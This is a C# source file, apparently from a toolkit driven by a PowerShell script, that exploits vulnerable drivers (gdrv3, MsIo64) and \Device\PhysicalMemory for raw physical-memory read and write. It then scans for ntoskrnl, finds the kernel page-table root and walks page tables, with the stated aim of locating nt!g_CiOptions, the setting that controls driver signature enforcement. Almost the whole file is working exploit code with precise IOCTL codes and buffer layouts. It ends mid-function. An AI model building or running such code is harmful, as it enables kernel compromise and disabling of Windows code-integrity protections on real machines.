// ============================================================================
// p36_prov.cs - physical-memory provider prober + kernel discovery.
// Loaded by p36_write.ps1 via Add-Type -Path (in-box csc, C# 5).
//
// W1  \Device\PhysicalMemory  NtOpenSection + NtMapViewOfSection (elevated,
//     SeLockMemoryPrivilege)              -> a real phys READ+WRITE view
// W2  MsIo64 0x80102040 / 0x80102044      -> fallback RW view; struct shape
//     derived from temp\drv\ RE (idx2=section handle, idx3=view base)
// W3  gdrv3 map/write completeness
// X   CR3 discovery, ntoskrnl discovery, VA->PA walk, nt!g_CiOptions find
//
// Only read primitive relied on: gdrv3 0xC3502014 (VERIFIED 2026-10-28, 2.5us).
// Hard rule from ext\gio.py: gdrv3 maps a PA without validating backing RAM,
// so a PA outside RAM bugchecks the box - everything goes through InRam().
// ============================================================================
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class P36Prov
{
    const uint GENERIC_READ = 0x80000000, GENERIC_WRITE = 0x40000000;
    const uint OPEN_EXISTING = 3, FILE_ATTRIBUTE_NORMAL = 0x80;
    const uint MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000, MEM_RELEASE = 0x8000;
    const uint PAGE_READWRITE = 0x04, PAGE_NOCACHE = 0x200;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x20, TOKEN_QUERY = 0x8;
    const uint SE_PRIVILEGE_ENABLED = 0x2;
    const long INVALID_HANDLE = -1;
    const uint SECTION_MAP_READ = 0x4, SECTION_MAP_WRITE = 0x2;
    const uint OBJ_CASE_INSENSITIVE = 0x40;

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(string name, uint access, uint share, IntPtr sa,
                                     uint disp, uint flags, IntPtr tmpl);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(IntPtr h, uint code, IntPtr inBuf, uint inLen,
                                       IntPtr outBuf, uint outLen, out uint ret, IntPtr ov);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr addr, IntPtr size, uint type, uint prot);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr addr, IntPtr size, uint type);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualLock(IntPtr addr, IntPtr size);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualUnlock(IntPtr addr, IntPtr size);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr proc, uint access, out IntPtr tok);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool LookupPrivilegeValueW(string sys, string name, out LUID luid);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr tok, bool disableAll,
                                             ref TOKEN_PRIVILEGES np, uint len,
                                             IntPtr prev, IntPtr retLen);
    [DllImport("ntdll.dll")]
    static extern int NtOpenSection(out IntPtr h, uint access, ref OBJECT_ATTRIBUTES oa);
    [DllImport("ntdll.dll")]
    static extern int NtMapViewOfSection(IntPtr sec, IntPtr proc, out IntPtr baseAddr,
                                         IntPtr zeroBits, IntPtr commitSize, ref long offset,
                                         out IntPtr viewSize, uint inherit, uint allocType,
                                         uint protect);
    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(IntPtr proc, IntPtr baseAddr);
    [DllImport("ntdll.dll")]
    static extern int NtClose(IntPtr h);

    // x64 packing: native LUID sits at offset 4 (4-byte aligned), Attributes at 12,
    // struct size 16.  With "long Luid" the CLR pads the LUID to offset 8 and
    // AdjustTokenPrivileges then reads a garbage LUID -> ERROR_NOT_ALL_ASSIGNED
    // (1300) even when the privilege IS present and enabled.  Explicit LUID struct.
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    struct LUID { public uint Low; public int High; }
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    struct TOKEN_PRIVILEGES { public uint Count; public LUID Luid; public uint Attr; }
    [StructLayout(LayoutKind.Sequential)]
    struct UNICODE_STRING { public ushort Length, MaxLen; public IntPtr Buffer; }
    [StructLayout(LayoutKind.Sequential)]
    struct OBJECT_ATTRIBUTES
    {
        public uint Length; public IntPtr Root; public IntPtr Name;
        public uint Attributes; public IntPtr Sd; public IntPtr Sqos;
    }
    static IntPtr g_Stage;
    static int g_StageLen;

    public static string EnablePriv(string name)
    {
        IntPtr tok; LUID luid;
        if (!OpenProcessToken(new IntPtr(-1), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tok))
            return "OpenProcessToken err=" + Marshal.GetLastWin32Error();
        if (!LookupPrivilegeValueW(null, name, out luid))
            return "LookupPrivilegeValue err=" + Marshal.GetLastWin32Error();
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.Count = 1; tp.Luid = luid; tp.Attr = SE_PRIVILEGE_ENABLED;
        bool ok = AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        int err = Marshal.GetLastWin32Error();
        CloseHandle(tok);
        if (!ok) return "AdjustTokenPrivileges err=" + err;
        if (err == 1300) return "NOT_ASSIGNED (absent from token)";
        return "ok";
    }

    static IntPtr Stage(int size)
    {
        if (g_Stage != IntPtr.Zero && g_StageLen < size)
        {
            VirtualUnlock(g_Stage, new IntPtr(g_StageLen));
            VirtualFree(g_Stage, IntPtr.Zero, MEM_RELEASE);
            g_Stage = IntPtr.Zero;
        }
        if (g_Stage == IntPtr.Zero)
        {
            g_Stage = VirtualAlloc(IntPtr.Zero, new IntPtr(size), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (g_Stage == IntPtr.Zero) throw new Exception("VirtualAlloc err=" + Marshal.GetLastWin32Error());
            if (!VirtualLock(g_Stage, new IntPtr(size))) throw new Exception("VirtualLock err=" + Marshal.GetLastWin32Error());
            g_StageLen = size;
        }
        return g_Stage;
    }

    // ---- RAM truth table -----------------------------------------------------
    // gdrv3 maps the PA with no RAM validation -> a PA in a hole bugchecks the
    // box.  "pa < ramTop" is NOT a RAM test: on a 32 GB box the PCI/MMIO hole
    // sits BELOW ramTop.  Proven 01/11 21:54:22 - 0x3B, AV_gdrv3!unknown_function,
    // rip=gdrv3+0x4b4a, r15=0xC3502014 (our read IOCTL), PROCESS=powershell.exe;
    // the same bucket hit 27/10 23:50:06 with PROCESS=python.exe.
    // So the valid set is the real range list from
    // HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory\.Translated.
    public static ulong[] RamStarts = new ulong[0];
    public static ulong[] RamEnds   = new ulong[0];
    public static ulong RamTopFallback;
    public delegate void Note(string s);
    public static Note Notify;

    public static void SetRamRanges(string csv, ulong ramTopFallback)
    {
        RamTopFallback = ramTopFallback;
        if (string.IsNullOrEmpty(csv)) return;
        string[] p = csv.Split(',');
        ulong[] s = new ulong[p.Length];
        ulong[] e = new ulong[p.Length];
        int n = 0;
        for (int i = 0; i < p.Length; i++)
        {
            int d = p[i].IndexOf('-');
            if (d <= 0) continue;
            s[n] = Convert.ToUInt64(p[i].Substring(0, d), 16);
            e[n] = Convert.ToUInt64(p[i].Substring(d + 1), 16);
            if (e[n] > s[n]) n++;
        }
        RamStarts = new ulong[n]; RamEnds = new ulong[n];
        Array.Copy(s, RamStarts, n); Array.Copy(e, RamEnds, n);
    }

    // ---- the RAM truth table, from a source that actually works ----------------
    // .NET's RegistryKey cannot read REG_RESOURCE_LIST: GetValue(".Translated") returns
    // NULL and GetValueKind says "Unknown" (verified on this box 01/11).  That is why
    // the caller's PowerShell parse came out EMPTY and the hole filter silently
    // degenerated to "pa < ramTop" - i.e. straight into the PCI/MMIO hole.  Read the raw
    // value with RegQueryValueEx and take the CmResourceTypeMemory (3) descriptors out
    // of the CM_RESOURCE_LIST.
    const int HKEY_LOCAL_MACHINE = unchecked((int)0x80000002);
    const int KEY_READ = 0x20019;

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegOpenKeyEx(IntPtr root, string sub, int opt, int sam, out IntPtr hk);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegQueryValueEx(IntPtr hk, string name, IntPtr res, out int type, byte[] data, ref int cb);
    [DllImport("advapi32.dll")]
    static extern int RegCloseKey(IntPtr hk);

    public static string RamRangesFromRegistry()
    {
        IntPtr hk;
        int st = RegOpenKeyEx(new IntPtr(HKEY_LOCAL_MACHINE),
                              @"HARDWARE\RESOURCEMAP\System Resources\Physical Memory",
                              0, KEY_READ, out hk);
        if (st != 0) return "open=0x" + st.ToString("x");
        try
        {
            int type = 0, cb = 0;
            st = RegQueryValueEx(hk, ".Translated", IntPtr.Zero, out type, null, ref cb);
            if (st != 0 || cb <= 0) return "query=0x" + st.ToString("x") + " cb=" + cb;
            byte[] rb = new byte[cb];
            st = RegQueryValueEx(hk, ".Translated", IntPtr.Zero, out type, rb, ref cb);
            if (st != 0) return "read=0x" + st.ToString("x") + " type=" + type;
            if (cb < 16) return "short cb=" + cb + " type=" + type;

            int off = 4;
            uint cnt = BitConverter.ToUInt32(rb, 0);
            StringBuilder sb = new StringBuilder();
            int guard = 0;
            for (uint l = 0; l < cnt && off + 16 <= cb; l++)
            {
                off += 12;                                     // CM_RESOURCE_LIST header
                if (off + 4 > cb) break;
                uint n = BitConverter.ToUInt32(rb, off); off += 4;
                // FIXED 02/11: the live .Translated dump (_ritual\_ramhex.txt, list rev 5,
                // 5 descriptors) shows 20-BYTE descriptors: type(1)+share(1)+flags(2)+
                // start(8)+length(8), and the top region is CmResourceTypeMemoryLarge(7)
                // with CM_RESOURCE_MEMORY_LARGE_40 flags 0x200 (length stored >> 8).
                // The old 16-byte/4-byte walk read exactly one range (1000-9e000) and
                // starved the whole X discovery (p36 run 1, 01:48:30).
                for (uint d = 0; d < n && off + 20 <= cb && guard++ < 4096; d++)
                {
                    byte t = rb[off];
                    ushort flags = BitConverter.ToUInt16(rb, off + 2);
                    ulong s0 = BitConverter.ToUInt64(rb, off + 4);
                    ulong ln = BitConverter.ToUInt64(rb, off + 12);
                    off += 20;
                    if (ln == 0) continue;
                    if (t == 7)
                    {
                        if ((flags & 0x0200) != 0) ln <<= 8;        // CM_RESOURCE_MEMORY_LARGE_40
                        else if ((flags & 0x0400) != 0) ln <<= 16; // CM_RESOURCE_MEMORY_LARGE_48
                        else if ((flags & 0x0800) != 0) ln <<= 32; // CM_RESOURCE_MEMORY_LARGE_64
                    }
                    if (t == 3 || t == 7)
                    {
                        if (sb.Length > 0) sb.Append(',');
                        sb.Append(s0.ToString("x")).Append('-').Append((s0 + ln).ToString("x"));
                    }
                }
            }
            return sb.Length > 0 ? sb.ToString() : "no-memory-descriptors cb=" + cb;
        }
        finally { RegCloseKey(hk); }
    }

    // PA ranges that are KNOWN to av gdrv3, learned from a previous crash's durable
    // breadcrumb (p36_write.ps1 reads its own io tail and maintains p36_badpa.txt).
    // Keeping them out of InRamSpan lets a re-run walk past the hole instead of dying
    // on the same page every single time.
    public static ulong[] BadStarts = new ulong[0];
    public static ulong[] BadEnds   = new ulong[0];

    public static void SetBadRanges(string csv)
    {
        if (string.IsNullOrEmpty(csv)) return;
        string[] p = csv.Split(',');
        ulong[] s = new ulong[p.Length];
        ulong[] e = new ulong[p.Length];
        int n = 0;
        for (int i = 0; i < p.Length; i++)
        {
            int d = p[i].IndexOf('-');
            if (d <= 0) continue;
            s[n] = Convert.ToUInt64(p[i].Substring(0, d).Trim(), 16);
            e[n] = Convert.ToUInt64(p[i].Substring(d + 1).Trim(), 16);
            if (e[n] > s[n]) n++;
        }
        BadStarts = new ulong[n]; BadEnds = new ulong[n];
        Array.Copy(s, BadStarts, n); Array.Copy(e, BadEnds, n);
    }

    // true when [pa, pa+size) overlaps any blacklisted range
    public static bool IsBad(ulong pa, int size)
    {
        for (int i = 0; i < BadEnds.Length; i++)
            if (pa < BadEnds[i] && pa + (ulong)size > BadStarts[i]) return true;
        return false;
    }

    public static bool InRam(ulong pa)
    {
        if (IsBad(pa, 1)) return false;
        if (RamEnds.Length == 0)
        {
            if (RamTopFallback == 0) return true;
            return pa < RamTopFallback && !(pa >= 0xA0000 && pa < 0x100000);
        }
        for (int i = 0; i < RamEnds.Length; i++)
            if (pa >= RamStarts[i] && pa < RamEnds[i]) return true;
        return false;
    }

    // the whole [pa, pa+size) must live inside ONE range - a read that straddles a
    // range end walks into a hole and avs the driver.
    public static bool InRamSpan(ulong pa, int size)
    {
        if (IsBad(pa, size)) return false;
        if (RamEnds.Length == 0) return InRam(pa);
        for (int i = 0; i < RamEnds.Length; i++)
            if (pa >= RamStarts[i] && pa + (ulong)size <= RamEnds[i]) return true;
        return false;
    }

    public static bool InRam(ulong pa, ulong ramTop) { return InRam(pa); }

    public static string GdrvOpen(out IntPtr h)
    {
        h = CreateFileW(@"\\.\GIOV3", GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        if (h.ToInt64() == INVALID_HANDLE) return "err=" + Marshal.GetLastWin32Error();
        return "";
    }

    // The proven call discipline (temp\drv\physread.py, ext\gio.py): ONE 4 KiB
    // page per IOCTL, locked non-zeroed dst, out_len 0.  A single >4 KiB read is
    // what silently killed the first p36 scan.
    public static int SkippedOutOfRam;   // refused because the PA is not backed by RAM
    public static int Issued;            // IOCTLs actually handed to gdrv3
    public static ulong LastIssuedPa;    // the PA of the last IOCTL (breadcrumb)

    // raw = no RAM validation (use it to measure what gdrv3 itself tolerates)
    public static byte[] GdrvReadOneRaw(IntPtr h, ulong pa, int size)
    {
        IntPtr stage = Stage(Math.Max(size, 0x1000));
        IntPtr inb = Marshal.AllocHGlobal(0x18);
        try
        {
            Marshal.WriteInt64(inb, 0x00, (long)pa);
            Marshal.WriteInt32(inb, 0x08, size);
            Marshal.WriteInt32(inb, 0x0C, 0);
            Marshal.WriteInt64(inb, 0x10, stage.ToInt64());
            LastIssuedPa = pa; Issued++;
            if (Notify != null)
                Notify(string.Format("  [io] read pa=0x{0:x} size=0x{1:x}{2}", pa, size,
                                     InRamSpan(pa, size) ? "" : "   <<< NOT RAM-BACKED"));
            uint got;
            bool ok = DeviceIoControl(h, 0xC3502014, inb, 0x18, IntPtr.Zero, 0, out got, IntPtr.Zero);
            if (!ok && Marshal.GetLastWin32Error() == 1450)
            {
                // 1450 = ERROR_NO_SYSTEM_RESOURCES: specific pages fail intermittently
                // (MDL/pool pressure).  Do not kill whole scans - return zeros so the
                // caller just misses a match there and moves on.
                return new byte[size];
            }
            if (!ok)
                throw new Exception("read pa=0x" + pa.ToString("x") + " size=0x" + size.ToString("x")
                                    + " err=" + Marshal.GetLastWin32Error());
            byte[] res = new byte[size];
            Marshal.Copy(stage, res, 0, size);
            return res;
        }
        finally { Marshal.FreeHGlobal(inb); }
    }

    // validated read - the default for every scan/walk step
    public static byte[] GdrvReadOne(IntPtr h, ulong pa, int size)
    {
        if (!InRamSpan(pa, size))
        {
            SkippedOutOfRam++;
            if (Notify != null)
                Notify(string.Format("  [io] SKIP pa=0x{0:x} size=0x{1:x} (hole/not RAM)", pa, size));
            return new byte[size];
        }
        return GdrvReadOneRaw(h, pa, size);
    }

    public static byte[] GdrvRead(IntPtr h, ulong pa, int size)
    {
        const int CH = 0x1000;
        byte[] outb = new byte[size];
        int off = 0;
        while (off < size)
        {
            int n = Math.Min(CH, size - off);
            byte[] part = GdrvReadOne(h, pa + (ulong)off, n);
            Array.Copy(part, 0, outb, off, n);
            off += n;
        }
        return outb;
    }

    // Which single-call sizes does the read accept?  (falsifies the "size is
    // capped at one page" theory instead of assuming it)
    public static string SizeLadder(IntPtr g, ulong pa, out string rep)
    {
        rep = "";
        int[] sizes = new int[] { 0x40, 0x100, 0x800, 0x1000, 0x2000, 0x4000, 0x10000, 0x20000 };
        int okCount = 0;
        for (int i = 0; i < sizes.Length; i++)
        {
            try
            {
                byte[] b = GdrvReadOneRaw(g, pa, sizes[i]);
                rep += string.Format("  size 0x{0:x} ok (first={1:x2})\r\n", sizes[i], b[0]);
                okCount++;
            }
            catch (Exception e) { rep += string.Format("  size 0x{0:x} FAIL {1}\r\n", sizes[i], e.Message); }
        }
        return okCount.ToString();
    }

    // Is the read range limited?  dword probe every `step` bytes, errors caught.
    public static string SweepRead(IntPtr g, ulong from, ulong to, ulong step, out string rep)
    {
        rep = "";
        int okCount = 0, failCount = 0;
        ulong firstFail = 0, lastOk = 0, lastFail = 0;
        for (ulong pa = from; pa < to; pa += step)
        {
            try { RdD(g, pa); okCount++; lastOk = pa; }
            catch (Exception)
            {
                failCount++; if (firstFail == 0) firstFail = pa; lastFail = pa;
                if (failCount <= 6) rep += string.Format("  fail pa=0x{0:x}\r\n", pa);
            }
        }
        rep += string.Format("  ok={0} fail={1} firstFail=0x{2:x} lastOk=0x{3:x} lastFail=0x{4:x}\r\n",
                             okCount, failCount, firstFail, lastOk, lastFail);
        return okCount.ToString();
    }


    public static ulong RdQ(IntPtr h, ulong pa) { return BitConverter.ToUInt64(GdrvRead(h, pa, 8), 0); }
    public static uint RdD(IntPtr h, ulong pa) { return BitConverter.ToUInt32(GdrvRead(h, pa, 4), 0); }

    public static string Hex(byte[] b)
    {
        StringBuilder sb = new StringBuilder(b.Length * 3);
        for (int i = 0; i < b.Length; i++) { sb.Append(b[i].ToString("x2")); if (i + 1 < b.Length) sb.Append(' '); }
        return sb.ToString();
    }
    // ---- W1: physical R/W through \Device\PhysicalMemory (native) ----------
    public static string PhysMemOpen(out IntPtr section)
    {
        section = IntPtr.Zero;
        string p1 = EnablePriv("SeLockMemoryPrivilege");
        string nm = @"\Device\PhysicalMemory";
        IntPtr nameBuf = Marshal.StringToHGlobalUni(nm);
        IntPtr usBuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
        try
        {
            UNICODE_STRING us = new UNICODE_STRING();
            us.Length = (ushort)(nm.Length * 2);
            us.MaxLen = (ushort)((nm.Length + 1) * 2);
            us.Buffer = nameBuf;
            Marshal.StructureToPtr(us, usBuf, false);
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            oa.Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
            oa.Name = usBuf;
            oa.Attributes = OBJ_CASE_INSENSITIVE;
            IntPtr s;
            int st = NtOpenSection(out s, SECTION_MAP_READ | SECTION_MAP_WRITE, ref oa);
            if (st < 0) return string.Format("priv={0} NtOpenSection=0x{1:x8}", p1, st);
            section = s;
            return string.Format("priv={0} NtOpenSection=ok handle=0x{1:x}", p1, s.ToInt64());
        }
        finally
        {
            Marshal.FreeHGlobal(nameBuf);
            Marshal.FreeHGlobal(usBuf);
        }
    }

    public static string PhysMemMap(IntPtr section, ulong pa, uint size, bool nocache,
                                    out IntPtr view, out long viewSize)
    {
        view = IntPtr.Zero; viewSize = size;
        IntPtr b; long off = (long)pa; IntPtr vs;
        int st = NtMapViewOfSection(section, new IntPtr(-1), out b, IntPtr.Zero, IntPtr.Zero,
                                    ref off, out vs, 1, 0,
                                    PAGE_READWRITE | (nocache ? PAGE_NOCACHE : 0));
        if (st < 0) return string.Format("NtMapViewOfSection pa=0x{0:x} st=0x{1:x8}", pa, st);
        view = b; viewSize = vs.ToInt64();
        return "";
    }

    public static string PhysMemUnmap(IntPtr section, IntPtr view)
    {
        int st = NtUnmapViewOfSection(new IntPtr(-1), view);
        if (section != IntPtr.Zero) NtClose(section);
        return st < 0 ? string.Format("0x{0:x8}", st) : "";
    }

    // ---- W2: MsIo64 0x80102040 map / 0x80102044 unmap -----------------------
    public static string MsIoOpen(out IntPtr h)
    {
        h = CreateFileW(@"\\.\MSIO", GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        if (h.ToInt64() == INVALID_HANDLE) return "err=" + Marshal.GetLastWin32Error();
        return "";
    }

    // The 0x80102044 handler in MsIo64.sys (temp\drv\msio_1500.txt 0x156b)
    // requires InputBufferLength==0x28 and hands q[2] to the unmap worker as
    // the section handle, q[3] as the view base -> the map reply must carry
    // both in the SAME 5-qword buffer.
    public static string MsIoTry(IntPtr h, int shape, ulong pa, uint size,
                                 out uint err, out string outHex)
    {
        err = 0; outHex = "";
        int inLen = shape == 2 ? 0x18 : (shape == 3 ? 0x30 : 0x28);
        IntPtr inb = Marshal.AllocHGlobal(0x40);
        IntPtr outb = Marshal.AllocHGlobal(0x40);
        try
        {
            for (int i = 0; i < 0x40; i++) { Marshal.WriteByte(inb, i, 0); Marshal.WriteByte(outb, i, 0); }
            if (shape == 1) { Marshal.WriteInt64(inb, 0, size); Marshal.WriteInt64(inb, 8, (long)pa); }
            else { Marshal.WriteInt64(inb, 0, (long)pa); Marshal.WriteInt64(inb, 8, size); }
            uint got;
            bool ok = DeviceIoControl(h, 0x80102040, inb, (uint)inLen, outb, 0x40, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            byte[] ob = new byte[0x40];
            Marshal.Copy(outb, ob, 0, 0x40);
            outHex = Hex(ob);
            if (!ok) return string.Format("shape{0} FAIL err={1} info={2}", shape, err, got);
            return string.Format("shape{0} OK info={1}", shape, got);
        }
        finally { Marshal.FreeHGlobal(inb); Marshal.FreeHGlobal(outb); }
    }
    // ---- W3: gdrv3 map (0xC3502004) and copy-user-to-phys (0xC3502808) ------
    // Contract from the driver decode (gdrv3 RVA 0xA974: `cmp r9,0x10; jne INVALID;
    // cmp r8,0x10; jne INVALID`): inlen AND outlen must be EXACTLY 0x10 - the old
    // 0x20/0x20 call was answered with STATUS_INVALID_PARAMETER (87).  in =
    // { u64 pa, u32 size, u32 pad }; the handler writes the view base back into the
    // input slot and/or the out buffer, so both are captured.
    public static string GdrvMapTry(IntPtr h, ulong pa, ulong size, out ulong va, out uint err)
    {
        va = 0; err = 0;
        IntPtr inb = Marshal.AllocHGlobal(0x10);
        IntPtr outb = Marshal.AllocHGlobal(0x10);
        try
        {
            for (int i = 0; i < 0x10; i++) { Marshal.WriteByte(inb, i, 0); Marshal.WriteByte(outb, i, 0); }
            Marshal.WriteInt64(inb, 0, (long)pa);
            Marshal.WriteInt32(inb, 8, (int)size);
            uint got;
            bool ok = DeviceIoControl(h, 0xC3502004, inb, 0x10, outb, 0x10, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            ulong q0 = (ulong)Marshal.ReadInt64(inb, 0);
            ulong qo = (ulong)Marshal.ReadInt64(outb, 0);
            if (!ok) return string.Format("FAIL err={0} info={1} in0=0x{2:x} out0=0x{3:x}", err, got, q0, qo);
            va = (q0 != pa && q0 != 0) ? q0 : qo;
            return string.Format("OK info={0} in0=0x{1:x} out0=0x{2:x}", got, q0, qo);
        }
        finally { Marshal.FreeHGlobal(inb); Marshal.FreeHGlobal(outb); }
    }

    public static string GdrvCopyTry(IntPtr h, ulong a, ulong b, uint n, out uint err)
    {
        err = 0;
        IntPtr inb = Marshal.AllocHGlobal(0x18);
        try
        {
            Marshal.WriteInt64(inb, 0, (long)b);
            Marshal.WriteInt64(inb, 8, (long)a);
            Marshal.WriteInt32(inb, 16, (int)n);
            uint got;
            // client sends lpOutBuffer=NULL / nOutBufferSize=0 for the copy IOCTL
            bool ok = DeviceIoControl(h, 0xC3502808, inb, 0x18, IntPtr.Zero, 0, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            return ok ? "OK" : string.Format("FAIL err={0}", err);
        }
        finally { Marshal.FreeHGlobal(inb); }
    }

    public static bool CloseHandle2(IntPtr h) { return CloseHandle(h); }

    public static bool IsUserVa(ulong v)
    {
        if (v < 0x10000 || v >= 0x00007FFFFFFFFFFF) return false;
        if ((v & 0xFFF) != 0) return false;
        return true;
    }

    public static string ReadAt(ulong va, int n)
    {
        try { byte[] b = new byte[n]; Marshal.Copy(new IntPtr((long)va), b, 0, n); return Hex(b); }
        catch (Exception) { return null; }
    }

    public static bool WriteAt(ulong va, byte[] data)
    {
        try { Marshal.Copy(data, 0, new IntPtr((long)va), data.Length); return true; }
        catch (Exception) { return false; }
    }
    // ---- X1: RAM top + ntoskrnl physical locate (validated by an export) ---
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetPhysicallyInstalledSystemMemory(out ulong kb);

    public static ulong RamTop()
    {
        ulong kb;
        if (!GetPhysicallyInstalledSystemMemory(out kb)) return 0;
        return kb * 1024;
    }

    // A loader-mapped ntoskrnl PE, validated by finding a real export name in
    // its export table.  hal.dll/win32k are filtered by SizeOfImage.
    public static string ScanNtoskrnl(IntPtr g, ulong ramTop, ulong limit, out string hits)
    {
        hits = "";
        ulong top = Math.Min(ramTop, limit);
        byte[] chunk;
        for (ulong pa = 0x100000; pa < top; pa += 0x10000)
        {
            if (!InRam(pa, ramTop)) continue;
            chunk = GdrvRead(g, pa, 0x10000);
            for (int o = 0; o < 0x10000; o += 0x1000)
            {
                if (chunk[o] != 0x4D || chunk[o + 1] != 0x5A) continue;      // MZ
                uint e_lfanew = BitConverter.ToUInt32(chunk, o + 0x3C);
                if (e_lfanew < 0x40 || e_lfanew > 0x200) continue;
                int pe = o + (int)e_lfanew;
                if (pe + 0x120 > 0x10000) continue;
                if (BitConverter.ToUInt32(chunk, pe) != 0x00004550) continue; // PE\0\0
                if (BitConverter.ToUInt16(chunk, pe + 4) != 0x8664) continue; // amd64
                int opt = pe + 0x18;
                if (BitConverter.ToUInt16(chunk, opt) != 0x20B) continue;     // PE32+
                ushort subsys = BitConverter.ToUInt16(chunk, opt + 0x44);
                uint sizeImage = BitConverter.ToUInt32(chunk, opt + 0x38);
                if (subsys != 10) continue;                                   // NATIVE
                if (sizeImage < 0x400000 || sizeImage > 0x4000000) continue;
                ulong imgPa = (pa + (ulong)o) & ~0xFFFUL;
                string verify = ExportHas(g, imgPa, opt, 0x70, "PsLookupProcessByProcessId");
                string line = string.Format("  native PE pa=0x{0:x} sizeOfImage=0x{1:x} preferred=0x{2:x} export[{3}]",
                                            imgPa, sizeImage,
                                            BitConverter.ToUInt64(chunk, opt + 0x18), verify);
                hits += line + "\r\n";
                if (verify == "yes") return imgPa.ToString("x");
            }
        }
        return "";
    }

    // Export directory entry 0 (or 1 for a second dir) walk; returns "yes"/"no".
    static string ExportHas(IntPtr g, ulong imgPa, int opt, int dirOff, string want)
    {
        try
        {
            byte[] d = GdrvRead(g, imgPa + (ulong)(opt + dirOff), 8);
            uint rva = BitConverter.ToUInt32(d, 0), sz = BitConverter.ToUInt32(d, 4);
            if (rva == 0 || sz < 0x28) return "no-dir";
            byte[] ed = GdrvRead(g, imgPa + rva, 0x28);
            uint count = BitConverter.ToUInt32(ed, 0x18);       // NumberOfNames
            uint names = BitConverter.ToUInt32(ed, 0x20);       // AddressOfNames RVA
            if (count == 0 || count > 0x2000) return "no-names";
            byte[] tbl = GdrvRead(g, imgPa + names, (int)count * 4);
            for (uint i = 0; i < count; i++)
            {
                uint nrva = BitConverter.ToUInt32(tbl, (int)i * 4);
                byte[] nm = GdrvRead(g, imgPa + nrva, want.Length + 1);
                bool same = true;
                for (int k = 0; k < want.Length; k++) if (nm[k] != (byte)want[k]) { same = false; break; }
                if (same) return "yes";
            }
            return "no(" + count + ")";
        }
        catch (Exception) { return "err"; }
    }
    // ---- X2: CR3 discovery via the PML4 self-reference (index 0x1ED) -------
    // PXE_BASE = 0xFFFFF6FB7DBED000 -> PML4 index 0x1ED, and PML4[0x1ED] must
    // point at the PML4 itself.  A candidate is only accepted when the double
    // self-reference holds AND the kernel half of the table is populated.
    public static string FindPml4(IntPtr g, ulong ramTop, ulong limit, out ulong cr3, out string notes)
    {
        cr3 = 0; notes = "";
        ulong top = Math.Min(ramTop, limit);
        int seen = 0;
        for (ulong pa = 0x1000; pa + 0x1000 <= top; pa += 0x1000)
        {
            if (!InRam(pa, ramTop)) continue;
            ulong e = RdQ(g, pa + 0x1EDUL * 8);
            if ((e & 1) == 0) continue;
            if ((e & 0x000FFFFFFFFFF000UL) != pa) continue;
            ulong pdpt = e & 0x000FFFFFFFFFF000UL;
            ulong e2 = RdQ(g, pdpt + 0x1EDUL * 8);
            if ((e2 & 1) == 0) continue;
            if ((e2 & 0x000FFFFFFFFFF000UL) != pa) continue;
            int present = 0;
            for (int i = 0x100; i < 0x200; i++) if ((RdQ(g, pa + (ulong)i * 8) & 1) != 0) present++;
            seen++;
            if (seen <= 8) notes += string.Format("  self-map candidate cr3=0x{0:x} kernel_entries_present={1}\r\n", pa, present);
            if (present < 8) continue;
            if (cr3 == 0) cr3 = pa;
        }
        return cr3 == 0 ? "" : seen.ToString();
    }

    public static bool Walk(IntPtr g, ulong cr3, ulong va, out ulong pa)
    {
        pa = 0;
        ulong e = RdQ(g, cr3 + ((va >> 39) & 0x1FF) * 8);
        if ((e & 1) == 0) return false;
        ulong t = e & 0x000FFFFFFFFFF000UL;
        e = RdQ(g, t + ((va >> 30) & 0x1FF) * 8);
        if ((e & 1) == 0) return false;
        if ((e & 0x80) != 0) { pa = (e & 0x000FFFFFC0000000UL) + (va & 0x3FFFFFFFUL); return true; }
        t = e & 0x000FFFFFFFFFF000UL;
        e = RdQ(g, t + ((va >> 21) & 0x1FF) * 8);
        if ((e & 1) == 0) return false;
        if ((e & 0x80) != 0) { pa = (e & 0x000FFFFFFFE00000UL) + (va & 0x1FFFFFUL); return true; }
        t = e & 0x000FFFFFFFFFF000UL;
        e = RdQ(g, t + ((va >> 12) & 0x1FF) * 8);
        if ((e & 1) == 0) return false;
